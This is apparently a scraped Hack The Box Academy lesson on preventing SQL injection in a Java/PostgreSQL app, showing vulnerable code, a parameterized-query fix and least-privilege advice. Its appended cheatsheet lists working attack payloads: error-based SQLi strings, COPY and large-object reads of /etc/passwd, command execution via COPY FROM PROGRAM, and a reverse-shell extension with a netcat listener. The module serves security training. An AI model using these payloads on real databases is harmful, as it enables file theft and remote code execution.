---
technique: "Prevention"
family: "injection"
severity_hint: "critical"
tags: []
source: "_raw/Web attacks/Web Attacks/SQLi/PostgreSQL-Specific Techniques/Prevention.md"
source_sha256: "157b47a5e5ae2bb476bb092bbd850f88d43db43337e9f0c366612012cf58b18d"
curator_version: 2
review_status: imported-unreviewed
---

# Prevention

> Family: **injection** · Severity hint: **critical** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `java: // IndexController.java (Lines 50-76)`
- `java: // IndexController.java (Lines 50-76)`

## Playbook (operator notes)

# Prevention

### 

### 

[Advanced SQL Injections 83.33%](https://academy.hackthebox.com/beta/module/188)

- 
- 
- 

Section 11 / 12

# Preventing SQL Injection Vulnerabilities

## [Introduction](https://academy.hackthebox.com/beta/module/188/section/2002#introduction)

Throughout this module we identified many `SQL injection` vulnerabilities in `BlueBird`
 which is great for us as attackers, but means work for us as defenders.
 Let's take a look at what we can do to fix these vulnerabilities and 
prevent new ones in the future.

## [Parameterized Queries](https://academy.hackthebox.com/beta/module/188/section/2002#parameterized-queries)

The best way to prevent `SQL injection` is to use `parameterized queries`.
 This requires developers to write the SQL query with placeholders for 
variables that are later passed as arguments to the database so that it 
can easily distinguish between the code and avoid injection 
vulnerabilities

The exact syntax for parameterized queries depends on the `database`, `programming language` and `library` you use. In the case of `BlueBird`, we are using `JdbcTemplate` with `PostgreSQL`. Let's take the `SQL injection` vulnerability in `/find-user` as an example. This is what the vulnerable code looks like as is:

```java
// IndexController.java (Lines 50-76)

@GetMapping("/find-user")
public String findUser(@RequestParam String u, Model model, HttpServletResponse response) throws IOException {
<SNIP>
        String sql = "SELECT * FROM users WHERE username LIKE '%" + u + "%'";
        List<User> users = jdbcTemplate.query(sql, new BeanPropertyRowMapper(User.class));
<SNIP>
}
```

And this is what the same code would like like when using parameterized queries:

```java
// IndexController.java (Lines 50-76)

@GetMapping("/find-user")
public String findUser(@RequestParam String u, Model model, HttpServletResponse response) throws IOException {
<SNIP>
        String sql = "SELECT * FROM users WHERE username LIKE CONCAT('%', ?, '%')";
        List<User> users = jdbcTemplate.query(sql, new Object[]{u}, new BeanPropertyRowMapper(User.class));
<SNIP>
}
```

Rather than using `u` when defining `sql`, we put a `?` in the query as a placeholder and then pass `new Object[] {u}` as an argument to `jdbcTemplate.query`.

So now, we could try and run our PoC payload against the 'vulnerable' function once again (`'/**/and/**/1=1--`) and we should see that no results appear, indicating the vulnerability was fixed:

http://IP:PORT/find-user?u='/**/and/**/1=1--

## [Principle of Least Privilege](https://academy.hackthebox.com/beta/module/188/section/2002#principle-of-least-privilege)

In addition to using `parameterized queries`, we should make sure that the user connecting to the database doesn't have more permissions than needed ([Principal of Least Privilege](https://en.wikipedia.org/wiki/Principle_of_least_privilege)). In `BlueBird`, all database connections are done as a super user which is completely unnecessary.

### [Large Objects](https://academy.hackthebox.com/beta/module/188/section/2002#large-objects)

Since `PostgreSQL 9.0`, writing and reading large objects requires explicit permission. If we need to use `large objects`, then `SELECT/UPDATE` privileges should be granted accordingly as described in the [documentation](https://www.postgresql.org/docs/current/lo-implementation.html).

### [COPY](https://academy.hackthebox.com/beta/module/188/section/2002#copy)

According to the [documentation](https://www.postgresql.org/docs/current/sql-copy.html), the `COPY` command can only be used by superusers or users with explicit permissions (`pg_read_server_files`, `pg_write_server_files`, `pg_execute_server_program`).
 If there is no reason for the database user to by reading/writing 
files, then there is no reason to grant these permissions and allow for 
additional attack vectors.

### [Extensions](https://academy.hackthebox.com/beta/module/188/section/2002#extensions)

Creating extensions requires `CREATE` access to the given database. If your database user only needs to `SELECT/INSERT/UPDATE` data, then you can easily drop `CREATE` access to prevent any attacks via loading extensions.

## [Challenge](https://academy.hackthebox.com/beta/module/188/section/2002#challenge)

As
 an extra challenge, try to patch all the vulnerable functions that we 
identified and then re-run your exploits on them to ensure that they are
 no longer vulnerable.

**Table of Contents**

1

Introduction

---

- 
- 

2

Identifying Vulnerabilities

---

- 
- 
- 
- 
- 
- 
- 
- 

3

Advanced SQL Injection Techniques

---

- 
- 
- 
- 
- 
- 

4

PostgreSQL-Specific Techniques

---

- 
- 
- 
- 

5

Defending Against SQL Injection

1 Sections

---

- 
- Article
    
    Preventing SQL Injection Vulnerabilities
    
    In progress
    

6

Skills Assessment

1 Sections

---

- 
- 

11 / 12 Sections

**Ad Blocker Detected**
Please whitelist our site in your adblocker otherwise,
Technical Support chat may not load.

Close

**Cheatsheet**
The cheat sheet is a useful command reference for this module.
**[Interacting with PostgreSQL](https://academy.hackthebox.com/beta/module/188/section/2002#interacting-with-postgresql)**
`psql -h <host> -U <username> <database>`
**[Decompiling Java Archives](https://academy.hackthebox.com/beta/module/188/section/2002#decompiling-java-archives)
[Fernflower](https://academy.hackthebox.com/beta/module/188/section/2002#fernflower)**

        `bash
mkdir <OutputDirectory>
java -jar Fernflower.jar <Application>.jar <OutputDirectory>
cd <OutputDirectory>
jar -xf <Application>.jar`

**[JD-GUI](https://academy.hackthebox.com/beta/module/188/section/2002#jd-gui)**
`jd-gui <Application>.jar`
**[Regex Patterns for Finding SQLi Vulnerabilities](https://academy.hackthebox.com/beta/module/188/section/2002#regex-patterns-for-finding-sqli-vulnerabilities)**

        `regex
SELECT|UPDATE|DELETE|INSERT|CREATE|ALTER|DROP
(WHERE|VALUES).*?'
(WHERE|VALUES).*" +
.*sql.*"
jdbcTemplate`

**[Live Debugging Java Applications](https://academy.hackthebox.com/beta/module/188/section/2002#live-debugging-java-applications)**
`java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y,suspend=y -jar <Application>.jar`
**[Enabling PostgreSQL Logging](https://academy.hackthebox.com/beta/module/188/section/2002#enabling-postgresql-logging)**
`/etc/postgresql/13/main/postgresql.conf`
• Change `#logging_collector = off` to `logging_collector = on`
• `#log_statement = 'none'` to `log_statement = 'all'`
• Uncomment `#log_directory = '...'`
• Uncomment `#log_filename = '...'`
**[Common Character Bypasses](https://academy.hackthebox.com/beta/module/188/section/2002#common-character-bypasses)**
• Use `/**/` instead of `space`
• Use `$$string$$` instead of `'string'`
**[Error-Based SQL Injection](https://academy.hackthebox.com/beta/module/188/section/2002#error-based-sql-injection)**

        `sql
' and 0=CAST((SELECT VERSION()) AS INT)--
' and 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) as INT)--
' and 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables LIMIT 1) as INT)--
';SELECT CAST(CAST(QUERY_TO_XML('SELECT ...',TRUE,TRUE,'') AS TEXT) AS INT)--`

**[Reading and Writing Files](https://academy.hackthebox.com/beta/module/188/section/2002#reading-and-writing-files)
[Reading with COPY](https://academy.hackthebox.com/beta/module/188/section/2002#reading-with-copy)**

        `sql
CREATE TABLE tmp (t TEXT);
COPY tmp FROM '/etc/passwd';
COPY tmp FROM '/etc/hosts' DELIMITER E'\x07';
SELECT * FROM tmp;
DROP TABLE tmp;`

**[Reading with Large Objects](https://academy.hackthebox.com/beta/module/188/section/2002#reading-with-large-objects)**

        `sql
SELECT lo_import('/etc/passwd');
SELECT lo_get(16513);
SELECT data FROM pg_largeobject WHERE loid=16513 AND pageno=0;
echo 726f6f743<SNIP> | xxd -r -p`

**[Writing with COPY](https://academy.hackthebox.com/beta/module/188/section/2002#writing-with-copy)**

        `sql
CREATE TABLE tmp (t TEXT);
INSERT INTO tmp VALUES ('To hack, or not to hack, that is the question');
COPY tmp TO '/tmp/proof.txt';
DROP TABLE tmp;`

**[Writing with Large Objects](https://academy.hackthebox.com/beta/module/188/section/2002#writing-with-large-objects)**

        `sql
split -b 2048 /etc/passwd
xxd -ps -c 99999999999 xaa
SELECT lo_create(31337);
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 0, DECODE('726f6f74<SNIP>6269','HEX'));
SELECT lo_export(31337, '/tmp/passwd');
SELECT lo_unlink(31337);`

**[Command Execution](https://academy.hackthebox.com/beta/module/188/section/2002#command-execution)
[RCE with COPY](https://academy.hackthebox.com/beta/module/188/section/2002#rce-with-copy)**

        `sql
CREATE TABLE tmp(t TEXT);
COPY tmp FROM PROGRAM 'id';
SELECT * FROM tmp;
DROP TABLE tmp;`

**[RCE with Extensions](https://academy.hackthebox.com/beta/module/188/section/2002#rce-with-extensions)**

        `bash
sudo apt install postgresql-server-dev-13
gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c
nc -nvlp 443`

        `sql
CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;
SELECT rev_shell('127.0.0.1', 443);`

**[Defending Against SQL Injection](https://academy.hackthebox.com/beta/module/188/section/2002#defending-against-sql-injection)**
Use `parameterized queries`!

- • Change `#logging_collector = off` to `logging_collector = on`
- • `#log_statement = 'none'` to `log_statement = 'all'`
- • Uncomment `#log_directory = '...'`
- • Uncomment `#log_filename = '...'`
- • Use `/**/` instead of `space`
- • Use `$$string$$` instead of `'string'`

Close

## Source
Original note: `_raw/Web attacks/Web Attacks/SQLi/PostgreSQL-Specific Techniques/Prevention.md`
